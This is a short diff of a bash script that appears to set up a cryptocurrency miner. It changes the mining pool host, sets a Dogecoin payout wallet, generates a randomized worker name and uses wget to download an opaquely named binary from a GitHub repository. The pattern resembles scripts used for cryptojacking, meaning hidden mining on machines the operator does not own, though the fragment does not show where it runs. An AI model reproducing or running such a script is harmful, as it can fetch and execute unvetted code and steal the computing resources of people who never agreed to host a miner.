@@ -1,5 +1,5 @@
 #!/bin/bash
-POOL=etchash.unmineable.com:3333
+POOL=ethash.unmineable.com:3333
 WALLET=DOGE:D5MGKpXzWKB49xbVk6nt4q4gi7bjJvxdUT
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
 wget https://github.com/squibex/prem/raw/main/priyatama
